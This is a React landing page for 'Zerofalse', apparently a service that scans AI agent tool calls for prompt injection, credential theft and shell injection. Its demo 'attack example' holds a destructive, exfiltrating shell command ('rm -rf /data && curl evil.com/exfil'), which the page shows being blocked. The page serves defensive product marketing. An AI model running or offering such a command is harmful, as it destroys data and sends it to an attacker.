import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { Shield, Lock, Terminal, Database, Code, CheckCircle, ArrowRight, AlertTriangle, Zap } from 'lucide-react';

export default function Landing() {
  const navigate = useNavigate();
  const [showSafeExample, setShowSafeExample] = useState(true);

  const safeExample = {
    payload: {
      tool_name: "search_documents",
      arguments: { query: "Q4 revenue report", limit: 10 }
    },
    result: {
      decision: "ALLOW",
      risk_score: 0.0,
      severity: "info",
      latency: "1.8ms"
    }
  };

  const attackExample = {
    payload: {
      tool_name: "execute_shell",
      arguments: { command: "rm -rf /data && curl evil.com/exfil" }
    },
    result: {
      decision: "BLOCK",
      risk_score: 0.95,
      severity: "critical",
      threat: "Recursive delete + data exfiltration",
      latency: "2.1ms"
    }
  };

  const currentExample = showSafeExample ? safeExample : attackExample;

  return (
    <div className="min-h-screen bg-white">
      <nav className="sticky top-0 z-50 bg-white/80 backdrop-blur-md border-b border-gray-200" data-testid="landing-nav">
        <div className="max-w-7xl mx-auto px-6 py-4">
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-2">
              <div className="w-9 h-9 bg-blue-600 rounded-lg flex items-center justify-center">
                <Shield className="w-5 h-5 text-white" />
              </div>
              <span className="text-xl font-bold text-gray-900" style={{ fontFamily: 'Syne, sans-serif' }}>
                Zerofalse
              </span>
            </div>

            <div className="flex items-center gap-8">
              <a href="#features" className="text-sm font-medium text-gray-700 hover:text-blue-600 transition-colors">
                Features
              </a>
              <a href="#pricing" className="text-sm font-medium text-gray-700 hover:text-blue-600 transition-colors">
                Pricing
              </a>
              <button
                onClick={() => navigate('/login')}
                className="text-sm font-medium text-gray-700 hover:text-blue-600 transition-colors"
                data-testid="nav-login-btn"
              >
                Login
              </button>
              <button
                onClick={() => navigate('/signup')}
                className="px-5 py-2.5 text-sm font-semibold text-white bg-blue-600 hover:bg-blue-700 rounded-lg transition-colors"
                data-testid="nav-signup-btn"
              >
                Start Free
              </button>
            </div>
          </div>
        </div>
      </nav>

      <section className="pt-20 pb-24 px-6">
        <div className="max-w-6xl mx-auto text-center">
          <h1
            className="text-5xl sm:text-6xl lg:text-7xl font-bold text-gray-900 mb-6 leading-tight"
            style={{ fontFamily: 'Syne, sans-serif' }}
            data-testid="hero-title"
          >
            Stop AI Agent Attacks<br />Before They Execute
          </h1>
          <p className="text-lg sm:text-xl text-gray-600 max-w-3xl mx-auto mb-10 leading-relaxed" style={{ fontFamily: 'DM Sans, sans-serif' }}>
            Zerofalse inspects every tool call your AI agent makes in real time — blocking prompt injection,
            credential theft, and agent hijacking before any damage is done.
          </p>

          <div className="flex items-center justify-center gap-4 mb-12">
            <button
              onClick={() => navigate('/signup')}
              className="px-8 py-4 text-base font-semibold text-white bg-blue-600 hover:bg-blue-700 rounded-lg transition-all hover:scale-105"
              data-testid="hero-start-free-btn"
            >
              Start Free — No Card Required
            </button>
            <button
              onClick={() => document.getElementById('features').scrollIntoView({ behavior: 'smooth' })}
              className="px-8 py-4 text-base font-semibold text-gray-700 bg-white hover:bg-gray-50 border-2 border-gray-300 rounded-lg transition-colors"
              data-testid="hero-see-how-btn"
            >
              See How It Works
            </button>
          </div>

          <div className="flex items-center justify-center gap-8 text-sm text-gray-600">
            <div className="flex items-center gap-2">
              <Zap className="w-4 h-4 text-blue-600" />
              <span>&lt; 2ms scan latency</span>
            </div>
            <div className="w-px h-4 bg-gray-300" />
            <div className="flex items-center gap-2">
              <Shield className="w-4 h-4 text-blue-600" />
              <span>40+ threat patterns</span>
            </div>
            <div className="w-px h-4 bg-gray-300" />
            <div className="flex items-center gap-2">
              <Code className="w-4 h-4 text-blue-600" />
              <span>Works with any agent framework</span>
            </div>
          </div>
        </div>
      </section>

      <section className="py-20 px-6 bg-gray-900 text-white">
        <div className="max-w-6xl mx-auto">
          <h2 className="text-4xl font-bold mb-12 text-center" style={{ fontFamily: 'Syne, sans-serif' }}>
            Your AI Agents Are Flying Blind
          </h2>
          
          <div className="grid md:grid-cols-2 gap-6">
            <div className="p-6 bg-gray-800 rounded-xl border border-gray-700">
              <div className="w-12 h-12 bg-red-500/10 rounded-lg flex items-center justify-center mb-4">
                <Terminal className="w-6 h-6 text-red-400" />
              </div>
              <h3 className="text-xl font-bold mb-2" style={{ fontFamily: 'Syne, sans-serif' }}>Prompt Injection</h3>
              <p className="text-gray-400 text-sm leading-relaxed">
                Attackers manipulate your agent's instructions through user input, causing it to execute unauthorized
                commands or leak sensitive data.
              </p>
            </div>

            <div className="p-6 bg-gray-800 rounded-xl border border-gray-700">
              <div className="w-12 h-12 bg-red-500/10 rounded-lg flex items-center justify-center mb-4">
                <Lock className="w-6 h-6 text-red-400" />
              </div>
              <h3 className="text-xl font-bold mb-2" style={{ fontFamily: 'Syne, sans-serif' }}>Credential Theft</h3>
              <p className="text-gray-400 text-sm leading-relaxed">
                API keys, tokens, and secrets accidentally exposed in tool arguments or agent memory,
                ready to be harvested by malicious actors.
              </p>
            </div>

            <div className="p-6 bg-gray-800 rounded-xl border border-gray-700">
              <div className="w-12 h-12 bg-red-500/10 rounded-lg flex items-center justify-center mb-4">
                <AlertTriangle className="w-6 h-6 text-red-400" />
              </div>
              <h3 className="text-xl font-bold mb-2" style={{ fontFamily: 'Syne, sans-serif' }}>Shell Injection</h3>
              <p className="text-gray-400 text-sm leading-relaxed">
                Malicious shell commands injected through tool calls, enabling attackers to delete files,
                exfiltrate data, or compromise your entire system.
              </p>
            </div>

            <div className="p-6 bg-gray-800 rounded-xl border border-gray-700">
              <div className="w-12 h-12 bg-red-500/10 rounded-lg flex items-center justify-center mb-4">
                <Database className="w-6 h-6 text-red-400" />
              </div>
              <h3 className="text-xl font-bold mb-2" style={{ fontFamily: 'Syne, sans-serif' }}>Memory Poisoning</h3>
              <p className="text-gray-400 text-sm leading-relaxed">
                Attackers plant false information in your agent's memory, corrupting future decisions
                and creating persistent backdoors in your system.
              </p>
            </div>
          </div>
        </div>
      </section>

      <section id="features" className="py-24 px-6 bg-white">
        <div className="max-w-6xl mx-auto">
          <div className="grid lg:grid-cols-2 gap-12 items-center">
            <div>
              <h2 className="text-4xl font-bold text-gray-900 mb-6" style={{ fontFamily: 'Syne, sans-serif' }}>
                Real-Time Tool Call Inspection
              </h2>
              <p className="text-gray-600 mb-8 leading-relaxed">
                Every time your AI agent makes a tool call, Zerofalse intercepts it, scans for threats,
                and decides whether to allow, warn, or block — all in under 2 milliseconds.
              </p>
              
              <ul className="space-y-4">
                {[
                  'Detects 40+ attack patterns including prompt injection and credential leaks',
                  'Evaluates tool names and arguments for malicious intent',
                  'Blocks dangerous operations before execution',
                  'Provides detailed evidence and threat classification',
                  'Works with LangChain, CrewAI, AutoGen, MCP, and custom frameworks'
                ].map((item, idx) => (
                  <li key={idx} className="flex items-start gap-3">
                    <CheckCircle className="w-5 h-5 text-green-600 mt-0.5 flex-shrink-0" />
                    <span className="text-gray-700">{item}</span>
                  </li>
                ))}\n              </ul>
            </div>

            <div className="bg-gray-50 rounded-2xl p-6 border border-gray-200">
              <div className="flex gap-2 mb-4">
                <button
                  onClick={() => setShowSafeExample(true)}
                  className={`px-4 py-2 text-sm font-medium rounded-lg transition-colors ${
                    showSafeExample
                      ? 'bg-white text-gray-900 shadow-sm'
                      : 'bg-transparent text-gray-600 hover:bg-gray-100'
                  }`}
                  data-testid="safe-example-btn"
                >
                  Safe Example
                </button>
                <button
                  onClick={() => setShowSafeExample(false)}
                  className={`px-4 py-2 text-sm font-medium rounded-lg transition-colors ${
                    !showSafeExample
                      ? 'bg-white text-gray-900 shadow-sm'
                      : 'bg-transparent text-gray-600 hover:bg-gray-100'
                  }`}
                  data-testid="attack-example-btn"
                >
                  Attack Example
                </button>
              </div>

              <div className="space-y-4">
                <div>
                  <div className="text-xs font-semibold text-gray-500 mb-2">TOOL CALL PAYLOAD</div>
                  <div className="bg-gray-900 rounded-lg p-4 font-mono text-xs text-gray-300">
                    <div>tool_name: "{currentExample.payload.tool_name}"</div>
                    <div>arguments: {JSON.stringify(currentExample.payload.arguments, null, 2)}</div>
                  </div>
                </div>

                <div>
                  <div className="text-xs font-semibold text-gray-500 mb-2">SCAN RESULT</div>
                  <div className={`rounded-lg p-4 ${currentExample.result.decision === 'ALLOW' ? 'bg-green-50 border border-green-200' : 'bg-red-50 border border-red-300'}`}>
                    <div className="flex items-center justify-between mb-3">
                      <span className={`px-3 py-1 rounded-full text-xs font-bold ${currentExample.result.decision === 'ALLOW' ? 'bg-green-600 text-white' : 'bg-red-600 text-white'}`}>
                        {currentExample.result.decision}
                      </span>
                      <span className="text-xs font-mono text-gray-600">{currentExample.result.latency}</span>
                    </div>
                    <div className="space-y-1 text-sm">
                      <div className="flex justify-between">
                        <span className="text-gray-600">Risk Score:</span>
                        <span className="font-semibold">{(currentExample.result.risk_score * 100).toFixed(0)}%</span>
                      </div>
                      <div className="flex justify-between">
                        <span className="text-gray-600">Severity:</span>
                        <span className="font-semibold capitalize">{currentExample.result.severity}</span>
                      </div>
                      {currentExample.result.threat && (
                        <div className="mt-2 pt-2 border-t border-gray-200">
                          <span className="text-xs text-gray-600">Threat:</span>
                          <p className="text-xs font-medium text-gray-900 mt-1">{currentExample.result.threat}</p>
                        </div>
                      )}
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </section>

      <section className="py-20 px-6 bg-gray-900 text-white">
        <div className="max-w-4xl mx-auto text-center">
          <h2 className="text-4xl font-bold mb-6" style={{ fontFamily: 'Syne, sans-serif' }}>
            Three Lines to Integrate
          </h2>
          <p className="text-gray-400 mb-10">Add Zerofalse to your agent in minutes</p>

          <div className="bg-gray-800 rounded-xl p-6 text-left border border-gray-700">
            <div className="font-mono text-sm text-gray-300 space-y-2">
              <div><span className="text-purple-400">from</span> <span className="text-blue-400">zerofalse</span> <span className="text-purple-400">import</span> ZerofalseClient</div>
              <div className="mt-4"><span className="text-gray-500"># Initialize with your API key</span></div>
              <div>zf = ZerofalseClient(api_key=<span className="text-green-400">"zf_live_..."</span>)</div>
              <div className="mt-4"><span className="text-gray-500"># Protect any tool call</span></div>
              <div><span className="text-purple-400">@zf</span>.guard_tool</div>
              <div><span className="text-purple-400">def</span> <span className="text-blue-400">execute_shell</span>(command):</div>
              <div className="pl-8"><span className="text-purple-400">return</span> os.system(command)</div>
            </div>
          </div>
        </div>
      </section>

      <section id="pricing" className="py-24 px-6 bg-white">
        <div className="max-w-6xl mx-auto">
          <div className="text-center mb-16">
            <h2 className="text-4xl font-bold text-gray-900 mb-4" style={{ fontFamily: 'Syne, sans-serif' }}>
              Simple, Transparent Pricing
            </h2>
            <p className="text-gray-600">Start free, scale as you grow</p>
          </div>

          <div className="grid md:grid-cols-3 gap-6">
            <div className="p-8 bg-white border border-gray-200 rounded-2xl hover:shadow-lg transition-shadow">
              <div className="text-sm font-semibold text-gray-500 mb-2">FREE</div>
              <div className="text-5xl font-bold text-gray-900 mb-1" style={{ fontFamily: 'Syne, sans-serif' }}>$0</div>
              <div className="text-sm text-gray-500 mb-6">Forever</div>
              
              <ul className="space-y-3 mb-8">
                <li className="flex items-start gap-2 text-sm text-gray-700">
                  <CheckCircle className="w-5 h-5 text-green-600 flex-shrink-0" />
                  <span>10K scans/month</span>
                </li>
                <li className="flex items-start gap-2 text-sm text-gray-700">
                  <CheckCircle className="w-5 h-5 text-green-600 flex-shrink-0" />
                  <span>3 agents</span>
                </li>
                <li className="flex items-start gap-2 text-sm text-gray-700">
                  <CheckCircle className="w-5 h-5 text-green-600 flex-shrink-0" />
                  <span>Community support</span>
                </li>
              </ul>

              <button
                onClick={() => navigate('/signup')}
                className="w-full py-3 text-sm font-semibold text-gray-700 bg-gray-100 hover:bg-gray-200 rounded-lg transition-colors"
                data-testid="pricing-free-btn"
              >
                Get Started
              </button>
            </div>

            <div className="p-8 bg-white border-2 border-blue-600 rounded-2xl shadow-xl relative">
              <div className="absolute -top-3 left-1/2 -translate-x-1/2 px-3 py-1 bg-blue-600 text-white text-xs font-bold rounded-full">
                MOST POPULAR
              </div>
              
              <div className="text-sm font-semibold text-blue-600 mb-2">STARTER</div>
              <div className="text-5xl font-bold text-gray-900 mb-1" style={{ fontFamily: 'Syne, sans-serif' }}>$499</div>
              <div className="text-sm text-gray-500 mb-6">per month</div>
              
              <ul className="space-y-3 mb-8">
                <li className="flex items-start gap-2 text-sm text-gray-700">
                  <CheckCircle className="w-5 h-5 text-blue-600 flex-shrink-0" />
                  <span>1M scans/month</span>
                </li>
                <li className="flex items-start gap-2 text-sm text-gray-700">
                  <CheckCircle className="w-5 h-5 text-blue-600 flex-shrink-0" />
                  <span>10 agents</span>
                </li>
                <li className="flex items-start gap-2 text-sm text-gray-700">
                  <CheckCircle className="w-5 h-5 text-blue-600 flex-shrink-0" />
                  <span>All detection engines</span>
                </li>
                <li className="flex items-start gap-2 text-sm text-gray-700">
                  <CheckCircle className="w-5 h-5 text-blue-600 flex-shrink-0" />
                  <span>Email support</span>
                </li>
              </ul>

              <button
                onClick={() => navigate('/signup')}
                className="w-full py-3 text-sm font-semibold text-white bg-blue-600 hover:bg-blue-700 rounded-lg transition-colors"
                data-testid="pricing-starter-btn"
              >
                Start Free Trial
              </button>
            </div>

            <div className="p-8 bg-white border border-gray-200 rounded-2xl hover:shadow-lg transition-shadow">
              <div className="text-sm font-semibold text-gray-500 mb-2">GROWTH</div>
              <div className="text-5xl font-bold text-gray-900 mb-1" style={{ fontFamily: 'Syne, sans-serif' }}>$1,999</div>
              <div className="text-sm text-gray-500 mb-6">per month</div>
              
              <ul className="space-y-3 mb-8">
                <li className="flex items-start gap-2 text-sm text-gray-700">
                  <CheckCircle className="w-5 h-5 text-green-600 flex-shrink-0" />
                  <span>10M scans/month</span>
                </li>
                <li className="flex items-start gap-2 text-sm text-gray-700">
                  <CheckCircle className="w-5 h-5 text-green-600 flex-shrink-0" />
                  <span>Unlimited agents</span>
                </li>
                <li className="flex items-start gap-2 text-sm text-gray-700">
                  <CheckCircle className="w-5 h-5 text-green-600 flex-shrink-0" />
                  <span>MCP proxy</span>
                </li>
                <li className="flex items-start gap-2 text-sm text-gray-700">
                  <CheckCircle className="w-5 h-5 text-green-600 flex-shrink-0" />
                  <span>SSO</span>
                </li>
                <li className="flex items-start gap-2 text-sm text-gray-700">
                  <CheckCircle className="w-5 h-5 text-green-600 flex-shrink-0" />
                  <span>Slack support</span>
                </li>
              </ul>

              <button
                onClick={() => navigate('/signup')}
                className="w-full py-3 text-sm font-semibold text-gray-700 bg-gray-100 hover:bg-gray-200 rounded-lg transition-colors"
                data-testid="pricing-growth-btn"
              >
                Get Started
              </button>
            </div>
          </div>
        </div>
      </section>

      <footer className="py-12 px-6 bg-gray-50 border-t border-gray-200">
        <div className="max-w-6xl mx-auto">
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-2">
              <div className="w-8 h-8 bg-blue-600 rounded-lg flex items-center justify-center">
                <Shield className="w-4 h-4 text-white" />
              </div>
              <span className="text-lg font-bold text-gray-900" style={{ fontFamily: 'Syne, sans-serif' }}>
                Zerofalse
              </span>
            </div>

            <div className="flex gap-8">
              <a href="#features" className="text-sm text-gray-600 hover:text-gray-900">Features</a>
              <a href="#pricing" className="text-sm text-gray-600 hover:text-gray-900">Pricing</a>
              <a href="/login" className="text-sm text-gray-600 hover:text-gray-900">Login</a>
            </div>
          </div>
          
          <div className="mt-8 text-center text-sm text-gray-500">
            © 2026 Zerofalse. Stop AI Agent Attacks Before They Execute.
          </div>
        </div>
      </footer>
    </div>
  );
}
